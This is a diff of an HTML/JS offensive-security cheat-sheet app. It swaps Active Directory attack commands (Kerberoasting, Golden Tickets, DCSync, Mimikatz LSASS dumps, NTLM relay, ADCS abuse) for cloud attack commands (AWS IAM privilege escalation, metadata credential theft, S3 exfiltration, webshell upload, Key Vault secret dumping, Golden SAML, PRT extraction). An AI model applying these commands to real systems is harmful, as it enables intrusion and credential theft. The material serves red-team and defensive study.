@@ -3,14 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Active Directory Attacks Reference</title>
+<title>Cloud Attacks Reference</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
 .mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}
 .off{color:#ef4444;font-weight:600;font-size:.82em}
 .hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}
-.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#fbbf24,#f59e0b,#ef4444,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#f59e0b,#60a5fa,#34d399);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .hd .sub{font-size:.62em;color:#374151}
 .st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}
 .sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}
@@ -66,335 +66,302 @@ var $=function(s){return document.querySelector(s)};
 var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
 function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
 var SE=[
-{id:"enu",l:"A. Enumeration",i:"\u{1F50D}",c:"#60a5fa"},
-{id:"krb",l:"B. Kerberos",i:"\u{1F3AB}",c:"#fbbf24"},
-{id:"acl",l:"C. ACL Abuse",i:"\u{1F511}",c:"#f87171"},
-{id:"crd",l:"D. Credentials",i:"\u{1F4BE}",c:"#a78bfa"},
-{id:"gpo",l:"E. GPO Abuse",i:"\u{1F4DC}",c:"#34d399"},
-{id:"pki",l:"F. ADCS / PKI",i:"\u{1F4DC}",c:"#e879f9"},
-{id:"tru",l:"G. Trusts",i:"\u{1F91D}",c:"#f59e0b"},
+{id:"aim",l:"A. AWS IAM",i:"\u{1F511}",c:"#f59e0b"},
+{id:"aws",l:"B. AWS Services",i:"\u2601\uFE0F",c:"#f87171"},
+{id:"eid",l:"C. Azure / Entra",i:"\u{1F4AD}",c:"#60a5fa"},
+{id:"azs",l:"D. Azure Services",i:"\u{1F4E6}",c:"#a78bfa"},
+{id:"gcp",l:"E. GCP",i:"\u{1F7E2}",c:"#34d399"},
+{id:"fed",l:"F. Multi-Cloud",i:"\u{1F504}",c:"#e879f9"},
+{id:"per",l:"G. Persistence",i:"\u{1F512}",c:"#fbbf24"},
 {id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
 {id:"byp",l:"I. Bypasses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}
 ];
-var S={s:'enu',t:'flow'};
+var S={s:'aim',t:'flow'};
 function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
 function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
 function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
 function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
 function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
 function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
-function fENU(){
-var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">AD ENUMERATION</div>';
+function fAIM(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">AWS IAM ATTACKS</div>';
 h+='<div class="grd">';
-h+=CRD("\u{1F4CA}","BloodHound / SharpHound","#60a5fa",
-F("","SharpHound.exe -c All,GPOLocalGroup","")+F("","Collector: Session, ACL, Trust, Container","")+F("","Output: ZIP of JSON for Neo4j ingest","")+F("","AzureHound for Entra ID / Azure AD","")+F("","BloodHound CE (Community Edition) new UI","")+F("","BOF: InlineExecute-Assembly for stealth",""));
-h+=CRD("\u{1F50D}","PowerView","#60a5fa",
-F("","Get-DomainUser -SPN (Kerberoastable)","")+F("","Get-DomainComputer -Unconstrained","")+F("","Get-DomainGroup -AdminCount","")+F("","Get-DomainObjectAcl -ResolveGUIDs","")+F("","Find-DomainShare -CheckAccess","")+F("","Get-DomainTrust -API",""));
-h+=CRD("\u{1F4E1}","LDAP Queries","#60a5fa",
-F("","ldapsearch -x -H ldap://DC -b 'DC=corp,DC=local'","")+F("","(&(objectClass=user)(servicePrincipalName=*))","")+F("","(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))","AS-REP roastable")+F("","(msDS-AllowedToDelegateTo=*)","")+F("","ADSearch.exe --search '(adminCount=1)'",""));
-h+=CRD("\u{1F3AF}","High-Value Target Discovery","#60a5fa",
-F("","Domain Admins, Enterprise Admins, Schema Admins","")+F("","Backup Operators (can DCSync equivalent)","")+F("","Account Operators (create/modify accounts)","")+F("","DnsAdmins (DLL injection on DC)","")+F("","gMSA accounts (password in AD attribute)","")+F("","LAPS: ms-Mcs-AdmPwd readers",""));
-h+=CRD("\u{1F5FA}\uFE0F","Domain Mapping","#60a5fa",
-F("","nltest /dclist:corp.local","")+F("","Get-ADDomainController -Filter *","")+F("","nslookup -type=SRV _ldap._tcp.corp.local","")+F("","Forest functional level: Get-ADForest","")+F("","Trust relationships: nltest /domain_trusts","")+F("","Sites and subnets: Get-ADReplicationSite",""));
-h+=CRD("\u{1F916}","Automated Recon","#60a5fa",
-F("","ADRecon.ps1 (comprehensive HTML report)","")+F("","PingCastle (security assessment + scoring)","")+F("","Grouper2 (GPO security analysis)","")+F("","Certify.exe find (ADCS misconfigurations)","")+F("","StandIn.exe (C# AD enumeration)",""));
+h+=CRD("\u{1F50D}","IAM Enumeration","#f59e0b",
+F("","aws sts get-caller-identity","")+F("","aws iam list-users / list-roles","")+F("","aws iam list-attached-user-policies --user X","")+F("","aws iam get-policy-version (read inline policies)","")+F("","Enumerate: users, groups, roles, policies, MFA",""));
+h+=CRD("\u{1F4A5}","Privilege Escalation Paths","#f59e0b",
+F("","iam:CreatePolicyVersion (overwrite policy)","")+F("","iam:SetDefaultPolicyVersion (activate old permissive version)","")+F("","iam:AttachUserPolicy / AttachRolePolicy (add admin)","")+F("","iam:PutUserPolicy / PutRolePolicy (inline policy)","")+F("","iam:CreateLoginProfile (set console password)","")+F("","iam:UpdateLoginProfile (change console password)","")+F("","iam:CreateAccessKey (new access key for any user)","")+F("","sts:AssumeRole (chain to more permissive role)","")+
+'<div style="font-size:.88em;color:#f87171;margin-top:4px">\u26A0 ~20+ documented IAM privesc paths. Check Rhino Security research.</div>');
+h+=CRD("\u{1F504}","Role Chaining","#f59e0b",
+F("","AssumeRole from one role to another","")+F("","Cross-account role assumption","")+F("","Role trust policy misconfiguration","")+F("","arn:aws:iam::*:root = ANY AWS account can assume","")+F("","Condition keys missing = overly permissive",""));
+h+=CRD("\u{1F511}","Access Key Abuse","#f59e0b",
+F("","Leaked keys: GitHub, .env files, CI/CD logs","")+F("","aws configure --profile stolen","")+F("","Check permissions: enumerate-iam.py","")+F("","Create new keys: aws iam create-access-key","")+F("","Keys don't expire (unless policy enforces)",""));
+h+=CRD("\u{1F464}","STS Token Theft","#f59e0b",
+F("","Temporary credentials from AssumeRole","")+F("","EC2 instance metadata: 169.254.169.254","")+F("","Lambda environment variables","")+F("","ECS task role credentials","")+F("","Duration: default 1hr, max 12hr",""));
 h+='</div>';return h;
 }
 
-function fKRB(){
-var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">KERBEROS ATTACKS</div>';
+function fAWS(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">AWS SERVICE ATTACKS</div>';
 h+='<div class="grd">';
-h+=CRD("\u{1F3AF}","Kerberoasting","#fbbf24",
-F("","Request TGS for SPN accounts, crack offline","")+F("","Any domain user can request TGS tickets","")+F("","Rubeus.exe kerberoast /outfile:hashes.txt","")+F("","GetUserSPNs.py -request corp.local/user:pass","")+F("","hashcat -m 13100 (RC4) or -m 19700 (AES)","")+
-'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No special privileges. Offline cracking. Silent.</div>');
-h+=CRD("\u{1F513}","AS-REP Roasting","#fbbf24",
-F("","Target: accounts without Kerberos pre-auth","")+F("","UAC flag: DONT_REQ_PREAUTH (0x400000)","")+F("","Rubeus.exe asreproast /outfile:hashes.txt","")+F("","GetNPUsers.py -no-pass corp.local/user","")+F("","hashcat -m 18200","")+
-'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Don\'t even need valid creds to request AS-REP.</div>');
-h+=CRD("\u{1F451}","Golden Ticket","#fbbf24",
-F("","Forge TGT with krbtgt hash","")+F("","kerberos::golden /domain:X /sid:X /krbtgt:HASH","")+F("","Any user, any group, any SID","")+F("","Valid until krbtgt rotated TWICE","")+F("","Rubeus.exe golden /rc4:HASH /user:X /ptt",""));
-h+=CRD("\u{1FA99}","Silver Ticket","#fbbf24",
-F("","Forge TGS with service account hash","")+F("","Never contacts DC = no DC-side logs","")+F("","Target: cifs/host, http/host, mssql/host","")+F("","kerberos::golden /service:cifs/target /rc4:HASH","")+F("","Great for targeted service access",""));
-h+=CRD("\u{1F504}","Delegation Abuse","#fbbf24",
-F("","Unconstrained: TGT forwarded to host","")+F("","Constrained: S4U2Self + S4U2Proxy","")+F("","RBCD: write msDS-AllowedToActOnBehalfOf...","")+F("","RBCD needs only write on computer object","")+F("","Coerce + unconstrained = DC TGT capture",""));
-h+=CRD("\u{1F4A5}","Diamond / Sapphire Tickets","#fbbf24",
-F("","Diamond: modify real TGT PAC (not forge)","")+F("","Decrypt TGT with krbtgt, edit PAC, re-encrypt","")+F("","Passes PAC signature validation","")+F("","Sapphire: S4U2Self + PAC from real DC query","")+F("","Harder to detect than Golden Tickets",""));
+h+=CRD("\u{1F4E6}","S3 Bucket Abuse","#f87171",
+F("","Public buckets: aws s3 ls s3://bucket --no-sign-request","")+F("","Misconfigured ACL: authenticated-users = ANY AWS account","")+F("","Bucket policy: Principal * = public access","")+F("","Upload webshell if writable","")+F("","Exfil: aws s3 sync s3://bucket ./local",""));
+h+=CRD("\u{1F4BB}","EC2 Metadata Service (IMDS)","#f87171",
+F("","http://169.254.169.254/latest/meta-data/","")+F("","IAM role creds: /meta-data/iam/security-credentials/ROLE","")+F("","Returns: AccessKeyId, SecretAccessKey, Token","")+F("","IMDSv2: requires PUT with token (X-aws-ec2-metadata-token-ttl-seconds)","")+F("","SSRF to metadata = credential theft",""));
+h+=CRD("\u{1F4DC}","Lambda Exploitation","#f87171",
+F("","Environment variables may contain secrets","")+F("","Lambda execution role: AssumeRole by Lambda service","")+F("","aws lambda get-function (download code + env vars)","")+F("","Inject into function code for persistence","")+F("","Layer poisoning: shared malicious layer",""));
+h+=CRD("\u{1F510}","Secrets Manager / SSM","#f87171",
+F("","aws secretsmanager list-secrets","")+F("","aws secretsmanager get-secret-value --secret-id X","")+F("","SSM Parameter Store: aws ssm get-parameters-by-path","")+F("","Often contains DB passwords, API keys","")+F("","ssm:SendCommand = remote code execution on EC2",""));
+h+=CRD("\u{1F3D7}\uFE0F","CloudFormation / Terraform State","#f87171",
+F("","CF templates may have hardcoded secrets","")+F("","aws cloudformation get-template --stack-name X","")+F("","Terraform state in S3: contains all outputs + secrets","")+F("","CF custom resources = Lambda execution","")+F("","Stack drift = unauthorized changes",""));
+h+=CRD("\u{1F4CA}","CloudTrail Gaps","#f87171",
+F("","Data events (S3, Lambda) not logged by default","")+F("","Some API calls not logged (sts:GetCallerIdentity pre-2019)","")+F("","Read-only vs management events","")+F("","Trail only in specific region (not global)","")+F("","Organizations trail vs account-level trail",""));
 h+='</div>';return h;
 }
 
-function fACL(){
-var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">ACL / DACL ABUSE</div>';
+function fEID(){
+var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">AZURE / ENTRA ID ATTACKS</div>';
 h+='<div class="grd">';
-h+=CRD("\u{1F511}","GenericAll","#f87171",
-F("","Full control over object","")+F("","On user: reset password, set SPN, add to group","")+F("","On group: add member (yourself)","")+F("","On computer: RBCD, LAPS read, shadow creds","")+F("","On GPO: modify and link to OU","")+
-'<div style="font-size:.88em;color:#f87171;margin-top:4px">Most powerful single ACE. Check all objects.</div>');
-h+=CRD("\u270D\uFE0F","WriteDACL","#f87171",
-F("","Modify permissions on the object","")+F("","Grant yourself GenericAll, then abuse","")+F("","Add-DomainObjectAcl -Rights All","")+F("","Or grant DCSync rights on domain object","")+F("","Self-escalation: WriteDACL \u2192 GenericAll",""));
-h+=CRD("\u{1F464}","WriteOwner","#f87171",
-F("","Change ownership of the object","")+F("","Owner can modify DACL (implicit WriteDACL)","")+F("","Set-DomainObjectOwner -Identity target -OwnerIdentity attacker","")+F("","Then: Add-DomainObjectAcl as new owner",""));
-h+=CRD("\u{1F504}","ForceChangePassword","#f87171",
-F("","Reset user password without knowing current","")+F("","net user target NewPass /domain","")+F("","Set-DomainUserPassword -Identity target","")+F("","No pre-authentication needed","")+F("","Noisy: user notices immediately",""));
-h+=CRD("\u{1F4DD}","WriteProperty","#f87171",
-F("","Write specific attribute on object","")+F("","SPN: Set SPN for Kerberoasting (targeted)","")+F("","Member: add to group directly","")+F("","msDS-AllowedToActOnBehalf: set RBCD","")+F("","msDS-KeyCredentialLink: shadow credentials",""));
-h+=CRD("\u{1F3AF}","Attack Path Chaining","#f87171",
-F("","WriteDACL \u2192 GenericAll \u2192 DCSync","")+F("","WriteOwner \u2192 WriteDACL \u2192 GenericAll","")+F("","AddMember on group \u2192 inherit group privileges","")+F("","GenericAll on computer \u2192 RBCD \u2192 service tickets","")+F("","BloodHound: Shortest Path to Domain Admin",""));
+h+=CRD("\u{1F50D}","Entra ID Enumeration","#60a5fa",
+F("","az ad user list / az ad group list","")+F("","az ad app list (app registrations)","")+F("","az ad sp list (service principals)","")+F("","Get-AzureADUser / Get-MgUser (MS Graph)","")+F("","ROADtools: roadrecon gather + GUI",""));
+h+=CRD("\u{1F4BB}","App Registration Abuse","#60a5fa",
+F("","Apps with Application permissions (not delegated)","")+F("","Client secret or certificate authentication","")+F("","App with Mail.ReadWrite.All = read all mailboxes","")+F("","Create new secret on existing app","")+F("","Consent grant attack: illicit consent",""));
+h+=CRD("\u{1F511}","Managed Identity Exploitation","#60a5fa",
+F("","System-assigned: tied to resource lifecycle","")+F("","User-assigned: independent, attached to multiple resources","")+F("","Token endpoint: 169.254.169.254 (VM) or IDENTITY_ENDPOINT (App Service)","")+F("","curl $IDENTITY_ENDPOINT?resource=https://management.azure.com","")+F("","Managed identity may have Reader/Contributor on subscription",""));
+h+=CRD("\u{1F4DC}","Runbook / Automation Account","#60a5fa",
+F("","Automation accounts run as service principal","")+F("","Run As account: high-priv certificate-based SP","")+F("","Runbooks execute PowerShell/Python in Azure","")+F("","Modify existing runbook for code execution","")+F("","Credential objects stored in automation account",""));
+h+=CRD("\u{1F451}","Global Admin Escalation","#60a5fa",
+F("","Entra ID Global Admin != Azure subscription access","")+F("","Elevate: User Access Administrator at root scope","")+F("","Portal: Properties -> Access management for Azure resources","")+F("","After elevation: Owner on all subscriptions","")+F("","Az CLI: az rest --method POST .../elevateAccess",""));
+h+=CRD("\u{1F504}","PRT (Primary Refresh Token)","#60a5fa",
+F("","Device-bound token for SSO across Azure/M365","")+F("","Equivalent of Kerberos TGT for Azure","")+F("","Extract with Mimikatz: sekurlsa::cloudap","")+F("","ROADtoken: extract PRT from joined device","")+F("","Use PRT to access any M365/Azure resource as user",""));
 h+='</div>';return h;
 }
 
-function fCRD(){
-var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">CREDENTIAL HARVESTING</div>';
+function fAZS(){
+var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">AZURE SERVICE ATTACKS</div>';
 h+='<div class="grd">';
-h+=CRD("\u{1F4BE}","DCSync","#a78bfa",
-F("","Replicate hashes via DRSUAPI protocol","")+F("","lsadump::dcsync /user:krbtgt","")+F("","secretsdump.py corp/admin@DC","")+F("","Requires: Replicating Directory Changes All","")+F("","No code execution on DC needed","")+F("","Gets NTLM hash + Kerberos keys",""));
-h+=CRD("\u{1F4C1}","NTDS.dit Extraction","#a78bfa",
-F("","ntdsutil 'ac i ntds' 'ifm' 'create full c:\\\\ntds'","")+F("","VSS shadow copy: vssadmin create shadow","")+F("","Copy NTDS.dit + SYSTEM from shadow","")+F("","secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL","")+F("","Offline extraction: no domain alerts",""));
-h+=CRD("\u{1F9E0}","LSASS Extraction","#a78bfa",
-F("","Mimikatz: sekurlsa::logonpasswords","")+F("","comsvcs.dll MiniDump (LOLBin)","")+F("","ProcDump (signed by Microsoft)","")+F("","nanodump (direct syscall, minimal footprint)","")+F("","PPLdump / PPLFault for protected LSASS",""));
-h+=CRD("\u{1F510}","DPAPI Secrets","#a78bfa",
-F("","Decrypt Chrome/Edge saved passwords","")+F("","RDP saved credentials (CREDHIST)","")+F("","Wi-Fi passwords","")+F("","dpapi::masterkey /in:masterkey /rpc (DC backup key)","")+F("","SharpDPAPI.exe triage",""));
-h+=CRD("\u{1F4E1}","Credential Relay","#a78bfa",
-F("","ntlmrelayx.py: relay captured NTLM auth","")+F("","PetitPotam: coerce DC to auth to attacker","")+F("","PrinterBug: SpoolSample triggers auth","")+F("","DFSCoerce: DFS-based authentication coercion","")+F("","Relay to LDAP for RBCD or shadow creds",""));
-h+=CRD("\u{1F511}","gMSA / LAPS Passwords","#a78bfa",
-F("","gMSA: msDS-ManagedPassword attribute","")+F("","Readable by authorized principals","")+F("","GMSAPasswordReader.exe","")+F("","LAPS: ms-Mcs-AdmPwd attribute on computer","")+F("","Get-LAPSPasswords / pyLAPS",""));
+h+=CRD("\u{1F4E6}","Storage Account Exposure","#a78bfa",
+F("","Public blob containers: https://acct.blob.core.windows.net/container?restype=container&comp=list","")+F("","Shared Access Signatures (SAS): time-limited URL tokens","")+F("","Over-permissive SAS with full account access","")+F("","Access keys: full storage account control","")+F("","az storage account keys list",""));
+h+=CRD("\u{1F510}","Key Vault Secrets","#a78bfa",
+F("","az keyvault list / az keyvault secret list","")+F("","az keyvault secret show --name X --vault-name Y","")+F("","Access policies: who can read secrets?","")+F("","Managed identity with Key Vault access = jackpot","")+F("","Certificates and keys also stored here",""));
+h+=CRD("\u{1F4BB}","VM / Compute Abuse","#a78bfa",
+F("","Custom Script Extension: execute on VM remotely","")+F("","az vm run-command invoke --command-id RunPowerShellScript","")+F("","VM disk snapshots: extract offline","")+F("","Serial console access if enabled","")+F("","Managed identity endpoint from within VM",""));
+h+=CRD("\u{1F4DC}","Function Apps","#a78bfa",
+F("","Similar to Lambda: serverless code execution","")+F("","App settings contain connection strings","")+F("","az functionapp config appsettings list","")+F("","Managed identity often assigned","")+F("","Deploy malicious function for persistence",""));
+h+=CRD("\u{1F3D7}\uFE0F","ARM Templates","#a78bfa",
+F("","Deployment history contains template + parameters","")+F("","az deployment group list / show","")+F("","Parameters may include passwords in cleartext","")+F("","secureString parameters not always used properly","")+F("","Template spec access = infrastructure knowledge",""));
+h+=CRD("\u{1F4E7}","Microsoft 365 / Graph API","#a78bfa",
+F("","Graph API: https://graph.microsoft.com/v1.0/","")+F("","Read mail: /me/messages or /users/X/messages","")+F("","SharePoint: /sites/root/drive/items","")+F("","Teams messages: /teams/X/channels/Y/messages","")+F("","With app permissions: access any user's data",""));
 h+='</div>';return h;
 }
 
-function fGPO(){
-var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">GROUP POLICY ABUSE</div>';
-h+='<div class="fr">';
-h+=B("GPO Write Access","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","BloodHound: check GPO write perms","")+F("","GenericAll / GenericWrite on GPO object","")+F("","Or: GPC file write on SYSVOL share","")+'</div>',220);
-h+=A("modify");
-h+=B("Malicious GPO Content","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Immediate scheduled task (GPP)","")+F("","Startup script (User or Computer)","")+F("","Registry modification","")+F("","Software install (MSI)","")+F("","Restricted groups (add to local admin)","")+'</div>',240);
-h+=A("apply");
-h+=B("Targets Affected","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","All computers/users in linked OU","")+F("","gpupdate /force to accelerate","")+F("","Default refresh: 90min + random 0-30min","")+F("","DCE: ~5min refresh on DCs","")+'</div>',220);
-h+='</div>';
-h+='<div class="grd" style="margin-top:8px">';
-h+=CRD("\u{1F4CB}","Immediate Scheduled Task","#34d399",
-F("","Most common GPO attack vector","")+F("","Create task via GPP ScheduledTasks.xml","")+F("","Runs immediately on policy refresh","")+F("","SharpGPOAbuse.exe --AddComputerTask","")+F("","Can target specific OU scope",""));
-h+=CRD("\u{1F4C4}","GPP Passwords (cpassword)","#34d399",
-F("","Legacy: Group Policy Preferences stored creds","")+F("","MS14-025: key published, still exploitable","")+F("","gpp-decrypt <cpassword hash>","")+F("","Get-GPPPassword (PowerSploit)","")+F("","Check: Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml",""));
-h+=CRD("\u{1F527}","SharpGPOAbuse","#34d399",
-F("","--AddLocalAdmin: add user to local admins via GPO","")+F("","--AddComputerScript: startup script","")+F("","--AddUserScript: logon script","")+F("","--AddComputerTask: immediate task","")+F("","Requires: GPO write + link to target OU",""));
+function fGCP(){
+var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">GCP ATTACKS</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F511}","Service Account Abuse","#34d399",
+F("","Default SA: PROJECT_NUMBER-compute@developer.gserviceaccount.com","")+F("","Key file: JSON with private key (never expires)","")+F("","gcloud auth activate-service-account --key-file=key.json","")+F("","Token from metadata: http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token","")+F("","Impersonation: --impersonate-service-account",""));
+h+=CRD("\u{1F4BB}","Compute Metadata","#34d399",
+F("","http://metadata.google.internal/computeMetadata/v1/","")+F("","Header required: Metadata-Flavor: Google","")+F("","SA token: /instance/service-accounts/default/token","")+F("","Project-level metadata: custom SSH keys","")+F("","Instance attributes: startup-script content",""));
+h+=CRD("\u{1F4E6}","Storage Buckets","#34d399",
+F("","gsutil ls gs://bucket-name","")+F("","Public: allUsers or allAuthenticatedUsers","")+F("","Uniform bucket-level access vs ACL","")+F("","Bucket policy only (no object-level ACL)","")+F("","gsutil cp gs://bucket/secret.txt ./",""));
+h+=CRD("\u{1F504}","IAM Privilege Escalation","#34d399",
+F("","iam.serviceAccounts.getAccessToken (impersonate any SA)","")+F("","iam.serviceAccountKeys.create (new key for any SA)","")+F("","iam.roles.update (escalate custom role)","")+F("","deploymentmanager.deployments.create (deploy as SA)","")+F("","cloudfunctions.functions.create (execute as SA)",""));
+h+=CRD("\u{1F30D}","Organization-Level","#34d399",
+F("","Org policies: restrictions at org/folder level","")+F("","Org admin = godmode across all projects","")+F("","Folder-level IAM bindings","")+F("","Billing account access: create projects","")+F("","gcloud organizations list / get-iam-policy",""));
+h+=CRD("\u{1F4DC}","Cloud Functions / Cloud Run","#34d399",
+F("","Serverless execution environment","")+F("","Attached service account permissions","")+F("","Environment variables with secrets","")+F("","Source code downloadable if authorized","")+F("","Deploy malicious function for code execution",""));
 h+='</div>';return h;
 }
-function fPKI(){
-var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">ADCS / PKI ATTACKS</div>';
+function fFED(){
+var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">MULTI-CLOUD / FEDERATION ATTACKS</div>';
 h+='<div class="grd">';
-h+=CRD("\u{1F4DC}","ESC1: Misconfigured Template","#e879f9",
-F("","Template allows: SAN (Subject Alt Name) specification","")+F("","+ Enrollee Supplies Subject","")+F("","+ Client Authentication EKU","")+F("","+ Low-priv user can enroll","")+F("","Request cert as Domain Admin \u2192 authenticate as DA","")+
-'<div style="font-size:.88em;color:#f87171;margin-top:4px">Most common ADCS attack. Check with Certify.exe find.</div>');
-h+=CRD("\u{1F513}","ESC2: Any Purpose Template","#e879f9",
-F("","Template has Any Purpose EKU or SubCA EKU","")+F("","Can be used as client auth certificate","")+F("","Similar to ESC1 but via broader EKU","")+F("","Certify.exe find /vulnerable",""));
-h+=CRD("\u{1F464}","ESC3: Enrollment Agent","#e879f9",
-F("","Template allows enrollment on behalf of others","")+F("","Step 1: get enrollment agent certificate","")+F("","Step 2: use it to enroll for another user","")+F("","Two-step process but very powerful",""));
-h+=CRD("\u{1F511}","ESC4: Template ACL Abuse","#e879f9",
-F("","Write access on certificate template object","")+F("","Modify template to be ESC1-vulnerable","")+F("","Change: msPKI-Certificate-Name-Flag","")+F("","Enable ENROLLEE_SUPPLIES_SUBJECT","")+F("","Then exploit as ESC1",""));
-h+=CRD("\u{1F4BB}","ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2","#e879f9",
-F("","CA flag allows SAN override on ANY template","")+F("","Even templates without ENROLLEE_SUPPLIES_SUBJECT","")+F("","certutil -config 'CA' -getreg policy\\\\EditFlags","")+F("","If flag set: any template becomes ESC1",""));
-h+=CRD("\u{1F500}","ESC8: NTLM Relay to ADCS","#e879f9",
-F("","Relay NTLM auth to CA web enrollment (HTTP)","")+F("","PetitPotam \u2192 relay to /certsrv/certfnsh.asp","")+F("","Get certificate as relayed machine/user","")+F("","ntlmrelayx.py --adcs --template DomainController","")+F("","Certificate \u2192 TGT via PKINIT",""));
-h+=CRD("\u{1F47B}","Shadow Credentials","#e879f9",
-F("","Write msDS-KeyCredentialLink on target","")+F("","Add attacker-controlled public key","")+F("","Authenticate via PKINIT with private key","")+F("","Whisker.exe add /target:DC$ /domain:corp.local","")+F("","Rubeus.exe asktgt /user:DC$ /certificate:cert.pfx /ptt","")+
-'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No password change. Stealthy. Survives password rotation.</div>');
-h+=CRD("\u{1F4B3}","Certificate Persistence (ESC13-style)","#e879f9",
-F("","Enrolled certificate valid for 1+ years","")+F("","Survives password changes","")+F("","Request cert, export PFX, use anytime","")+F("","certutil -exportPFX or Certify.exe request","")+F("","Golden certificate: CA private key = forge any cert",""));
+h+=CRD("\u{1F504}","SAML Token Forgery (Golden SAML)","#e879f9",
+F("","Steal ADFS token-signing certificate","")+F("","Forge SAML assertion for any user","")+F("","Authenticate to any federated service (AWS, Azure, GCP)","")+F("","No MFA check (assertion is post-auth)","")+F("","AADInternals: New-AADIntSAMLToken","")+
+'<div style="font-size:.88em;color:#f87171;margin-top:4px">\u26A0 Persists until signing cert is rotated. SolarWinds-style.</div>');
+h+=CRD("\u{1F511}","OIDC Federation Abuse","#e879f9",
+F("","AWS: IAM OIDC identity providers","")+F("","GitHub Actions OIDC -> AWS role assumption","")+F("","Misconfigured trust: any repo can assume role","")+F("","Azure: Workload identity federation","")+F("","GCP: Workload identity pool misconfig",""));
+h+=CRD("\u{1F3AB}","Token Theft & Replay","#e879f9",
+F("","Azure: access tokens from az account get-access-token","")+F("","AWS: STS temporary credentials from metadata","")+F("","GCP: OAuth2 tokens from metadata server","")+F("","Tokens usable from any IP (usually no IP binding)","")+F("","JWT decode: jwt.io for claim inspection",""));
+h+=CRD("\u{1F30D}","Cross-Cloud Pivoting","#e879f9",
+F("","AWS keys in Azure Key Vault (or vice versa)","")+F("","CI/CD pipeline with multi-cloud creds","")+F("","Terraform state with cross-cloud secrets","")+F("","Service mesh connecting cloud environments","")+F("","Shared secrets in environment variables",""));
+h+=CRD("\u{1F4E7}","Entra ID to M365 to Azure","#e879f9",
+F("","Compromise Entra ID user \u2192 M365 access","")+F("","M365 Global Admin \u2192 elevate to Azure access","")+F("","Azure Reader \u2192 find creds in resources","")+F("","Azure Contributor \u2192 code execution on VMs","")+F("","Full chain: phished creds \u2192 cloud admin",""));
+h+=CRD("\u{1F504}","On-Prem to Cloud Pivot","#e879f9",
+F("","Azure AD Connect: sync account has DCSync-equivalent","")+F("","ADFS: token-signing cert enables Golden SAML","")+F("","Hybrid-joined devices: PRT extraction","")+F("","Azure Arc: on-prem servers managed from cloud","")+F("","AWS SSM: cloud-managed on-prem agents",""));
